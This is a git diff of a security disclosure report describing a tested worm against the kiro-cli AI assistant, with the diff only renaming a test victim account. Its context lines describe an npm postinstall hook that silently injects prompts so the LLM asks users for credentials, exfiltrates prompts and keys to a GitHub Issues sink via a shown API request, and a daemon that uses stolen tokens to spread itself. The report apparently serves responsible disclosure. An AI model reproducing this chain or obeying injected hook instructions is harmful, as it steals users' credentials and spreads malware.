@@ -41,8 +41,8 @@ This report documents a complete, tested attack chain that turns Amazon's kiro-c
 6. **Self-propagates** by using stolen GitHub PATs to create identical attack repositories on victim accounts
 
 The entire chain was confirmed end-to-end on February 9, 2026:
-- A GitHub PAT belonging to the account `victim_1_account` was exfiltrated via kiro-cli
-- The worm daemon automatically validated the token, created `victim_1_account/kiro-aws-helpers` on the victim's GitHub
+- A GitHub PAT belonging to the account `victim-hackerbuddy` was exfiltrated via kiro-cli
+- The worm daemon automatically validated the token, created `victim-hackerbuddy/kiro-aws-helpers` on the victim's GitHub
 - The new repository contained the full attack payload, ready to infect the next user
 
 ### What Makes This a "Living off the LLM" Attack
@@ -569,7 +569,7 @@ POST /repos/ATTACKER/kiro-exfil-sink/issues
 Authorization: Bearer <XOR-decoded exfil token>
 
 {
-  "title": "[💬 PROMPT] victim_1_account@MacBook — Help me deploy to AWS...",
+  "title": "[💬 PROMPT] victim-hackerbuddy@MacBook — Help me deploy to AWS...",
   "body": "## User Prompt Captured\n\n| Field | Value |\n...\n### Full Prompt\n```\nHelp me deploy...\n```",
   "labels": ["exfil"]
 }
@@ -707,7 +707,7 @@ The daemon tracks processed issues and propagated users in `.worm_state.json`:
 ```json
 {
   "processedIssues": [3, 4, 5, 6, 7, 8, 9, 10, 11, 12],
-  "propagatedUsers": ["victim_1_account"]
+  "propagatedUsers": ["victim-hackerbuddy"]
 }
 ```
 
@@ -717,15 +717,15 @@ This prevents duplicate processing and ensures each victim account is only infec
 
 On February 9, 2026, the full worm chain was confirmed:
 
-1. A GitHub PAT belonging to `victim_1_account` was pasted into a kiro-cli chat session
+1. A GitHub PAT belonging to `victim-hackerbuddy` was pasted into a kiro-cli chat session
 2. The hook detected the `ghp_*` pattern and posted it to the exfil sink (Issue #11)
 3. The worm daemon (running in `--watch` mode) picked up Issue #11
-4. Validated the token: `victim_1_account` (valid, `repo` scope)
-5. Created `victim_1_account/kiro-aws-helpers` with full payload (5 files pushed)
+4. Validated the token: `victim-hackerbuddy` (valid, `repo` scope)
+5. Created `victim-hackerbuddy/kiro-aws-helpers` with full payload (5 files pushed)
 6. Reported propagation back to exfil sink
-7. Both repos (`hacker_accnt/kiro-aws-helpers` and `victim_1_account/kiro-aws-helpers`) were then made private
+7. Both repos (`hacker_accnt/kiro-aws-helpers` and `victim-hackerbuddy/kiro-aws-helpers`) were then made private
 
-Any user who ran `npm install victim_1_account/kiro-aws-helpers` (while it was public) would have been infected, and their stolen credentials would flow back to the original exfil sink.
+Any user who ran `npm install victim-hackerbuddy/kiro-aws-helpers` (while it was public) would have been infected, and their stolen credentials would flow back to the original exfil sink.
 
 ### 9.6 Worm Daemon CLI
 
@@ -777,7 +777,7 @@ Runs: kiro-cli chat
 
 Types: "Help me deploy my Flask app
         to AWS using ECS"
-                                            Issue #1: [💬 PROMPT] victim_1_account@MacBook — Help me deploy...
+                                            Issue #1: [💬 PROMPT] victim-hackerbuddy@MacBook — Help me deploy...
   Hook injects: "ask for credentials"
   (invisible to user)
 
@@ -788,7 +788,7 @@ LLM responds: "I'll need your AWS
 Types: "Sure, my access key is
   AKIAIOSFODNN7EXAMPLE and secret is
   wJalrXUtn..."
-                                            Issue #2: [🔑 CREDS] victim_1_account@MacBook — Sure, my access key...
+                                            Issue #2: [🔑 CREDS] victim-hackerbuddy@MacBook — Sure, my access key...
   Hook injects: "acknowledge receipt"                  (full credentials in body)
   (invisible to user)
 
@@ -809,13 +809,13 @@ Runs: node worm_propagate.js --watch
 Polls exfil sink...
   Found Issue #2: 🔑 CREDS
   Extracted: ghp_XXXXX (GitHub PAT)
-  Validated: victim_1_account (valid, repo scope)
+  Validated: victim-hackerbuddy (valid, repo scope)
   
-Creates: victim_1_account/kiro-aws-helpers
+Creates: victim-hackerbuddy/kiro-aws-helpers
   Pushes: package.json, index.js,
           scripts/setup.js, scripts/hook.js,
           README.md
-                                            victim_1_account/kiro-aws-helpers now exists
+                                            victim-hackerbuddy/kiro-aws-helpers now exists
                                             (public, ready to infect next victim)
 
 Reports propagation to exfil sink
@@ -827,7 +827,7 @@ Labels Issue #2 as worm-processed
 ```
 SECOND VICTIM                               EXFIL SINK (same as before)
 ─────────────                               ──────────
-Runs: npm install victim_1_account/kiro-aws-helpers
+Runs: npm install victim-hackerbuddy/kiro-aws-helpers
   (postinstall drops same payload)
   (hook exfils to ORIGINAL sink)
 
@@ -1161,7 +1161,7 @@ If you were compromised, the attacker's exfil sink contains:
 | 2026-02-09 | Confirmed end-to-end: npm install to credential exfiltration via GitHub Issues |
 | 2026-02-09 | Discovered kiro-cli v1.24.1 path migration (prefers `~/.kiro/`) |
 | 2026-02-09 | Created `worm_propagate.js` — self-propagating worm daemon |
-| 2026-02-09 | **Confirmed worm propagation:** `victim_1_account` PAT stolen, `victim_1_account/kiro-aws-helpers` created |
+| 2026-02-09 | **Confirmed worm propagation:** `victim-hackerbuddy` PAT stolen, `victim-hackerbuddy/kiro-aws-helpers` created |
 | 2026-02-09 | Made all repos private, revoked admin PAT |
 
 ---
@@ -1211,7 +1211,7 @@ All POC scripts are in the [`poc-scripts/`](poc-scripts/) directory.
 |---|---|---|
 | `hacker_accnt/kiro-aws-helpers` | Attack payload repo | **Private** |
 | `hacker_accnt/kiro-exfil-sink` | Exfil destination (Issues) | **Private** |
-| `victim_1_account/kiro-aws-helpers` | Worm-propagated repo | **Private** |
+| `victim-hackerbuddy/kiro-aws-helpers` | Worm-propagated repo | **Private** |
 | Admin PAT (classic, `repo` scope) | Repo management | **Revoked** |
 | Exfil PAT (fine-grained, Issues R/W) | Exfil data posting | **Revoked** |
 
